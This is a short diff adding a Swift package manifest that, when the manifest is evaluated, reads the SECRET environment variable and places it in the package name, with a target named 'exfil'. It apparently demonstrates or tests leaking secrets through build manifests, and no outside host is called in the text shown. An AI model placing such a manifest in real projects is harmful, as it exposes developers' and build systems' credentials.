@@ -1,0 +1,14 @@
+// swift-tools-version: 6.3
+
+import PackageDescription
+import Foundation
+
+let secret = ProcessInfo.processInfo.environment["SECRET"] ?? "nil"
+
+let package = Package(
+    name: secret,
+    products: [],
+    targets: [
+        .target(name: "exfil")
+    ]
+)
